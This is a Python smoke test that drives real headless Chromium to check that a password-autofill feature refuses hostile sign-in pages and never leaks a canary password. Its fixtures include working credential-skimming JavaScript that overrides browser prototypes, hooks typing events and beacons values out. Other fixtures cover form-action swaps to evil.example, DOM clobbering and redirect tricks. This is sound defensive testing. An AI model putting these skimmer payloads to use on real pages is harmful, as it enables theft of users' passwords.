#!/usr/bin/env python
"""Real-Chromium proof for "sign in with a saved login" (Desk slice P2b, `mc/desk_connect/signin_fill*.py`).

The unit tests script the page; this does not. It launches the pane's real headless Chromium
(`browser_routes._launch_browser`), serves HTTPS fixtures from a local server that answers to
`www.linkedin.com` (a declared sign-in host) and to `evil.example` (not declared) through
`--host-resolver-rules`, and runs the REAL `signin_fill.fill` (real `PageLink`, real isolated
world, real vault in a temp home) against them. The 2026-10-05 audit (Wren) captured a password
by serving a page that overrides `Array.prototype.indexOf`; that page is `/hostile` here, with
every other primitive the in-page script uses overridden too, listeners on every typing event,
and a beacon home.

  python tools/smoke/desk_signin_fill_hostile.py
  python tools/smoke/desk_signin_fill_hostile.py --simulate-old     # must FAIL: puts the audited weakness back

Prints one line per check, then `PASS n/n` (exit 0) or `FAIL` (exit 1). A canary password is typed
only into the honest page; the run fails if the canary ever reaches the undeclared host (its
server log AND what its own scripts captured). The vault, the Chromium profile and the fixtures
live in a temp dir; nothing touches a real profile or vault. Never installs anything: needs the
Chromium and `websocket-client` the pane already uses.
"""
from __future__ import annotations

import http.server
import json
import os
import shutil
import socket
import sqlite3
import ssl
import sys
import tempfile
import threading
import time
from pathlib import Path
from urllib.parse import urlsplit

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO))

TMP = Path(tempfile.mkdtemp(prefix='signin-hostile-'))
os.environ['CLAYRUNE_HOME'] = str(TMP / 'home')
os.environ['CLAYRUNE_SECRETS_KEY_BACKEND'] = 'file'
os.environ.pop('CLAUDE_CODE_SESSION_ID', None)

USER = 'ron.levy@example.test'
CANARY = 'PW-CANARY-Zx81-hostile-5521'
PROFILE = 'signin-smoke'
GOOD, EVIL = 'www.linkedin.com', 'evil.example'
LOOKALIKE = 'www.linkedin.com.evil.example'

# ---- fixtures -------------------------------------------------------------------------------

FORM = ('<form id="f" method="post" action="{action}"><input id="u" name="session_key" autocomplete="username">'
        '<input id="p" type="password" name="session_password" autocomplete="current-password">'
        '<button type="submit"{fa}>Sign in</button>{extra}</form>')


def page(body: str, head: str = '') -> bytes:
    return f'<!doctype html><meta charset="utf-8"><title>t</title>{head}<body>{body}</body>'.encode()


HOSTILE_JS = r"""
(function () {
  var cap = window.__cap = [];
  function send(k, v) {
    cap.push(k + '=' + v);
    try { navigator.sendBeacon('/collect', k + '=' + v); } catch (e) {}
    try { (new Image()).src = '/collect?' + k + '=' + encodeURIComponent(v); } catch (e) {}
  }
  var realValue = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
  var realExec = Document.prototype.execCommand;
  // every primitive the in-page origin check and the typing used to depend on
  Array.prototype.indexOf = function () { return 0; };
  Array.prototype.includes = function () { return true; };
  Array.prototype.filter = function (f) { return Array.prototype.slice.call(this); };
  String.prototype.indexOf = function () { return 0; };
  window.getComputedStyle = function () { return { visibility: 'visible', display: 'block', opacity: '1' }; };
  Element.prototype.getBoundingClientRect = function () { return { width: 200, height: 30 }; };
  Object.getOwnPropertyDescriptor = function (o, n) {
    var d = realValue; return { get: d.get, set: function (v) { send('desc-set', v); return d.set.call(this, v); } };
  };
  Object.defineProperty(HTMLInputElement.prototype, 'value', {
    configurable: true, get: realValue.get, set: function (v) { send('value-set', v); return realValue.set.call(this, v); } });
  Document.prototype.execCommand = function (c, s, v) { send('exec', v); return realExec.apply(this, arguments); };
  window.Event = function () { send('event', 'ctor'); };
  ['input', 'keydown', 'keypress', 'keyup', 'change', 'beforeinput', 'paste', 'submit', 'focus'].forEach(function (t) {
    window.addEventListener(t, function (e) { send(t, (e.data || (e.target && e.target.value) || '')); }, true);
  });
  setInterval(function () {
    var el = document.querySelectorAll('input'); for (var i = 0; i < el.length; i++) if (el[i].value) send('poll', el[i].value);
  }, 20);
})();
"""

SWAP_JS = """
document.addEventListener('input', function () {
  document.getElementById('f').setAttribute('action', 'https://%s/collect');
}, true);""" % EVIL

REDIR_JS = """
document.addEventListener('input', function () { setTimeout(function () { location.href = 'https://%s/hostile'; }, 0); }, true);""" % EVIL

PAGES: dict[tuple[str, str], bytes] = {
    (GOOD, '/login'): page(FORM.format(action='/checkpoint/lg/login-submit', fa='', extra='')),
    (GOOD, '/crossaction'): page(FORM.format(action=f'https://{EVIL}/collect', fa='', extra='')),
    (GOOD, '/formaction'): page(FORM.format(action='/checkpoint/lg/login-submit', fa=f' formaction="https://{EVIL}/collect"', extra='')),
    # DOM clobbering: named inputs shadow form.action / form.elements, <img name=activeElement> shadows document.activeElement
    (GOOD, '/clobber-evil'): page(FORM.format(action=f'https://{EVIL}/collect', fa='',
                                              extra='<input name="action" value="/checkpoint/lg/login-submit"><img name="activeElement">')),
    (GOOD, '/clobber-ok'): page(FORM.format(action='/checkpoint/lg/login-submit', fa='',
                                            extra='<input name="action" value="https://evil.example/collect"><img name="activeElement">'
                                                  '<input name="elements" value="x">')),
    (GOOD, '/swap'): page(FORM.format(action='/checkpoint/lg/login-submit', fa='', extra=''), f'<script>{SWAP_JS}</script>'),
    (GOOD, '/redir-on-input'): page(FORM.format(action='/checkpoint/lg/login-submit', fa='', extra=''), f'<script>{REDIR_JS}</script>'),
    (GOOD, '/iframe-evil'): page(FORM.format(action='/checkpoint/lg/login-submit', fa='', extra='') +
                                 f'<iframe src="https://{EVIL}/hostile" width="300" height="200"></iframe>'),
    (GOOD, '/feed'): page('<h1>feed</h1>'),
    (EVIL, '/plain'): page(FORM.format(action='/collect', fa='', extra='')),
    (EVIL, '/hostile'): page(FORM.format(action='/collect', fa='', extra=''), f'<script>{HOSTILE_JS}</script>'),
    (EVIL, '/frames-declared'): page(f'<iframe src="https://{GOOD}/login" width="400" height="300"></iframe>'),
    (LOOKALIKE, '/login'): page(FORM.format(action='/collect', fa='', extra=''), f'<script>{HOSTILE_JS}</script>'),
}

log: list[dict] = []
log_lock = threading.Lock()


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.0'

    def _rec(self, body: bytes = b'') -> None:
        host = (self.headers.get('Host') or '').split(':')[0]
        with log_lock:
            log.append({'host': host, 'method': self.command, 'path': self.path, 'body': body.decode('utf-8', 'replace'),
                        'headers': str(self.headers)})

    def _send(self, status: int, body: bytes = b'', ctype='text/html', extra=()) -> None:
        self.send_response(status)
        self.send_header('Content-Type', ctype)
        for k, v in extra:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._rec()
        host = (self.headers.get('Host') or '').split(':')[0]
        path = self.path.split('?')[0]
        if path == '/collect':
            return self._send(204)
        body = PAGES.get((host, path))
        self._send(200 if body is not None else 404, body or b'nope')

    def do_POST(self):
        n = int(self.headers.get('Content-Length') or 0)
        self._rec(self.rfile.read(n) if n else b'')
        host = (self.headers.get('Host') or '').split(':')[0]
        if host == GOOD and self.path.startswith('/checkpoint/'):
            return self._send(303, b'', extra=(('Location', '/feed'),))       # a successful sign-in redirects
        self._send(204)

    def log_message(self, *a):
        pass


def make_cert() -> tuple[str, str]:
    import datetime
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'fixture')])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=2)).sign(key, hashes.SHA256()))
    cp, kp = TMP / 'fixture.crt', TMP / 'fixture.key'
    cp.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    kp.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL,
                                     serialization.NoEncryption()))
    return str(cp), str(kp)


def serve() -> int:
    crt, key = make_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(crt, key)

    class TlsServer(http.server.ThreadingHTTPServer):
        daemon_threads = True

        def get_request(self):
            # handshake lazily, in the handler's thread: Chromium opens speculative sockets that never
            # speak, and a handshake in accept() would park the whole server on the first of them
            sock, addr = self.socket.accept()
            return ctx.wrap_socket(sock, server_side=True, do_handshake_on_connect=False), addr

    srv = TlsServer(('127.0.0.1', 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv.server_address[1]


# ---- the pane --------------------------------------------------------------------------------

from mc import secrets_store as vault                              # noqa: E402
from mc.blueprints import browser_routes as br                     # noqa: E402
from mc.desk_connect import signin_fill, signin_fill_js            # noqa: E402
from mc.desk_connect import signin_fill_cdp as cdp                 # noqa: E402
from mc.state import browser_sessions                              # noqa: E402

br._profiles_root = lambda: str(TMP / 'profiles')
br._named_profiles_root = lambda: str(TMP / 'profiles_named')
br._downloads_root = lambda: str(TMP / 'downloads')
br.wire(register_process_fn=lambda proc, **k: None, unregister_process_fn=lambda pid: None,
        popen_flags=0, startupinfo=None, server_port=0, uploads_dir=str(TMP / 'uploads'))

if '--simulate-old' in sys.argv:
    # Mutation check: trust the page's own answer (no browser-side URL check) and run in the page's own world,
    # as the code did before the 2026-10-05 audit. The hostile checks below must then fail.
    signin_fill._declared = lambda top, origins: True

    def _page_world(self, expression):
        try:
            res = self._call('Runtime.evaluate', {'expression': expression, 'returnByValue': True})
        except cdp.LinkError as ex:
            return False, str(ex)
        return True, (res.get('result') or {}).get('value')
    cdp.PageLink.evaluate = _page_world

results: list[tuple[bool, str]] = []


def check(ok: bool, what: str, detail: str = '') -> None:
    results.append((bool(ok), what))
    print(('ok   ' if ok else 'FAIL ') + what + (f'   [{detail}]' if detail and not ok else ''), flush=True)


class HookedPane(signin_fill.Pane):
    """The real pane; `before_fill(link)` runs just before the typing evaluation is sent (after both
    browser-side URL checks passed), to move the page the way a hostile one could."""

    def __init__(self, before_fill=None):
        self.before_fill = before_fill

    def open(self, session):
        link = super().open(session)
        hook = self.before_fill
        real = link.evaluate

        def evaluate(expression):
            if hook and '"fill": true' in expression:
                hook(link)
            return real(expression)
        link.evaluate = evaluate
        return link


def nav(url: str, want_host: str | None = None, timeout: float = 10) -> dict:
    """Navigate the pane's page and wait until the browser reports it loaded."""
    sess = signin_fill.Pane().find(PROFILE)
    with cdp.connect(sess) as link:
        link._call('Page.navigate', {'url': url})
        end = time.time() + timeout
        seen = ''
        while time.time() < end:
            time.sleep(0.15)
            try:
                top = link.top()
                ready = link._call('Runtime.evaluate', {'expression': 'document.readyState', 'returnByValue': True})
            except cdp.LinkError as ex:
                seen = str(ex)
                continue
            seen = f"{top} {ready}"
            if ((ready.get('result') or {}).get('value') == 'complete'
                    and (urlsplit(top['url']).hostname == want_host if want_host else top['url'] != 'about:blank')):
                time.sleep(0.3)
                return top
        raise RuntimeError(f'navigation to {url} did not settle: {seen}')


def page_eval(expression: str):
    sess = signin_fill.Pane().find(PROFILE)
    with cdp.connect(sess) as link:
        return (link._call('Runtime.evaluate', {'expression': expression, 'returnByValue': True}).get('result') or {}).get('value')


def run_fill(pane=None):
    """`(result dict | None, FillError | None)`."""
    try:
        return signin_fill.fill('linkedin', 'linkedin-browser', 'linkedin.login', PROFILE, pane=pane or HookedPane(),
                                sleep=lambda s: time.sleep(0.6)), None
    except signin_fill.FillError as e:
        return None, e


def captured_by(host_suffix: str) -> list[dict]:
    time.sleep(0.5)                                                    # let a beacon land
    with log_lock:
        return [r for r in log if r['host'].endswith(host_suffix) and (CANARY in json.dumps(r) or USER in json.dumps(r))]


def no_leak(*blobs) -> bool:
    return all(CANARY not in json.dumps(b, default=str) and USER not in json.dumps(b, default=str) for b in blobs)


def count_vault_reads(monkey: list):
    real = vault.get_secret_value

    def spy(*a, **k):
        monkey.append(a[0])
        return real(*a, **k)
    vault.get_secret_value = spy
    return lambda: setattr(vault, 'get_secret_value', real)


def main() -> int:
    port = serve()
    vault.set_secret('linkedin.login', CANARY, username=USER, entry_type=vault.ENTRY_LOGIN)
    rules = ','.join(f'MAP {h} 127.0.0.1:{port}' for h in (GOOD, EVIL, LOOKALIKE))
    sess, err = br._launch_browser('smoke', 'about:blank', profile=PROFILE,
                                   extra_args=[f'--host-resolver-rules={rules}', '--ignore-certificate-errors'])
    if err:
        print('FAIL could not launch Chromium:', err)
        return 1
    try:
        end = time.time() + 15
        while time.time() < end:
            try:
                cdp.connect(sess).close()
                break
            except cdp.LinkError:
                time.sleep(0.3)
        time.sleep(3)                      # the pane's own reader finishes its start-up navigation first
        reads: list = []
        undo = count_vault_reads(reads)

        # 0. control: the hostile page really does defeat a check that runs in the page's own world
        nav(f'https://{EVIL}/hostile', EVIL)
        old_check = f"['https://{GOOD}'].indexOf(location.origin) >= 0"          # the shape of the check the audit defeated
        check(page_eval(old_check) is True,
              f'control: on /hostile the old in-page origin check, run in the page world, wrongly says {GOOD} (location.origin is {EVIL})')
        sess0 = signin_fill.Pane().find(PROFILE)
        with cdp.connect(sess0) as link0:
            ok0, v0 = link0.evaluate(old_check)
        check(ok0 and v0 is False, 'the same check run in the isolated world answers correctly (false)', str((ok0, v0)))

        # 1. the honest page signs in; the password reaches only its own host
        nav(f'https://{GOOD}/login', GOOD)
        reads.clear()
        out, e = run_fill()
        check(out is not None and out.get('state') == 'submitted', 'honest sign-in page: typed and submitted', str(out or e))
        with log_lock:
            posts = [r for r in log if r['host'] == GOOD and r['method'] == 'POST' and r['path'].startswith('/checkpoint/')]
        check(len(posts) == 1 and CANARY in posts[0]['body'] and USER.replace('@', '%40') in posts[0]['body'],
              'honest sign-in page received exactly one POST carrying the login', str(posts)[:200])
        check(no_leak(out, e), 'the result carries neither the username nor the password')
        check(len(reads) == 1, 'the password was fetched from the vault once', str(reads))
        check(captured_by('evil.example') == [], 'nothing reached the undeclared host after the honest sign-in')

        # 2. the hostile pages, each refused with nothing typed and the vault not asked for the password
        def refused(label: str, url: str, host: str, code: str, **kw):
            nav(url, host)
            reads.clear()
            out, e = run_fill(**kw)
            got = e.code if e else (out or {}).get('state')
            check(e is not None and e.code == code, f'{label}: refused with {code}', f'{got} {out}')
            check(reads == [], f'{label}: the vault was not asked for the password', str(reads))
            check(captured_by('evil.example') == [], f'{label}: no canary at the undeclared host')
            cap = page_eval('JSON.stringify(window.__cap||[])')
            check(CANARY not in (cap or '') and USER not in (cap or ''), f'{label}: the page captured no typed value', str(cap)[:120])
            check(no_leak(str(e), out), f'{label}: the refusal carries no value')

        refused('hostile page (prototypes overridden, listeners, beacon)', f'https://{EVIL}/hostile', EVIL, 'origin_mismatch')
        refused('plain wrong host', f'https://{EVIL}/plain', EVIL, 'origin_mismatch')
        refused('look-alike host', f'https://{LOOKALIKE}/login', LOOKALIKE, 'origin_mismatch')
        refused('wrong host framing the declared sign-in page', f'https://{EVIL}/frames-declared', EVIL, 'origin_mismatch')
        refused('declared host, form posts to another origin', f'https://{GOOD}/crossaction', GOOD, 'action_mismatch')
        refused('declared host, submit button formaction elsewhere', f'https://{GOOD}/formaction', GOOD, 'action_mismatch')
        refused('declared host, action clobbered by <input name=action>', f'https://{GOOD}/clobber-evil', GOOD, 'action_mismatch')
        top = nav('data:text/html,<input type=password>')
        reads.clear()
        out, e = run_fill()
        check(e is not None and e.code == 'origin_mismatch' and reads == [], 'data: URL: refused, vault not asked', f'{top.get("url")[:30]} {e or out}')

        # 3. declared page that tries to confuse the script (clobbered names) but posts only home: still works
        nav(f'https://{GOOD}/clobber-ok', GOOD)
        with log_lock:
            before = len(log)
        out, e = run_fill()
        with log_lock:
            posts = [r for r in log[before:] if r['method'] == 'POST' and r['host'] == GOOD and r['path'].startswith('/checkpoint/')]
        check(out is not None and out.get('state') == 'submitted' and len(posts) == 1 and captured_by('evil.example') == [],
              'a page that clobbers form.action / document.activeElement / form.elements does not misdirect the typing', str(out or e))

        # 4. the page swaps the form action while the login is being typed
        nav(f'https://{GOOD}/swap', GOOD)
        with log_lock:
            before = len(log)
        out, e = run_fill()
        with log_lock:
            sent = [r for r in log[before:] if r['method'] == 'POST']
        check(out is not None and out.get('action_blocked') is True and out.get('state') == 'filled' and sent == [],
              'form action swapped to another origin mid-typing: typed login is NOT submitted, nothing posted', str(out or e))
        check(captured_by('evil.example') == [], 'the swapped action received nothing')

        # 5. the page navigates away mid-fill (between the last browser-side URL check and the typing)
        nav(f'https://{GOOD}/login', GOOD)
        reads.clear()

        def to_evil(link):
            link._call('Page.navigate', {'url': f'https://{EVIL}/hostile'})
            time.sleep(1.5)
        out, e = run_fill(HookedPane(before_fill=to_evil))
        check(e is not None and e.code == 'origin_mismatch', 'page navigated to the hostile host between the checks and the typing: refused',
              str(e or out))
        check(captured_by('evil.example') == [], 'mid-fill navigation: no canary at the undeclared host')
        cap = page_eval('JSON.stringify(window.__cap||[])')
        check(CANARY not in (cap or '') and USER not in (cap or ''), 'mid-fill navigation: the hostile page captured no typed value', str(cap)[:120])

        # 6. the declared page itself navigates to the hostile host as soon as it sees input
        nav(f'https://{GOOD}/redir-on-input', GOOD)
        out, e = run_fill()
        check(captured_by('evil.example') == [], 'declared page redirecting to the hostile host on input: the hostile host received no canary')
        cap = page_eval('JSON.stringify(window.__cap||[])')
        check(CANARY not in (cap or '') and USER not in (cap or ''), 'ditto: the hostile page captured no typed value', str(cap)[:120])
        check(no_leak(out, str(e)), 'ditto: the result carries no value', str(out or e))

        # 7. a hostile iframe inside the declared page is not typed into
        nav(f'https://{GOOD}/iframe-evil', GOOD)
        out, e = run_fill()
        check(captured_by('evil.example') == [], 'hostile cross-origin iframe inside the declared page: no canary reached it')

        undo()

        # 8. Chromium's password manager must not have kept the typed password
        br._kill_browser_session(sess)                                  # graceful close for a named profile writes the profile
        time.sleep(1.0)
        udd = Path(sess['user_data_dir'])
        saved = -1
        for rel in ('Default/Login Data', 'Default/Login Data For Account'):
            db = udd / rel
            if db.exists():
                copy = TMP / 'logins-copy.db'
                shutil.copyfile(db, copy)
                con = sqlite3.connect(copy)
                try:
                    saved = max(saved, con.execute('select count(*) from logins').fetchone()[0])
                finally:
                    con.close()
        blob = b''.join(p.read_bytes() for p in udd.rglob('*') if p.is_file() and p.stat().st_size < 50_000_000
                        and 'Cache' not in str(p) and 'GPU' not in str(p))
        print(f'     (Login Data rows: {saved if saved >= 0 else "no Login Data file"})', flush=True)
        check(saved in (-1, 0), 'Chromium saved no login into the profile (Login Data has 0 rows)', f'rows={saved}')
        check(CANARY.encode() not in blob, 'the canary password appears nowhere in the profile directory')
    finally:
        for s in list(browser_sessions.values()):
            try:
                br._kill_browser_session(s)
            except Exception as ex:
                print('teardown:', type(ex).__name__)
        shutil.rmtree(TMP, ignore_errors=True)
    bad = [w for ok, w in results if not ok]
    print(f'{"PASS" if not bad else "FAIL"} {len(results) - len(bad)}/{len(results)}')
    for w in bad:
        print('  failed:', w)
    return 0 if not bad else 1


if __name__ == '__main__':
    sys.exit(main())
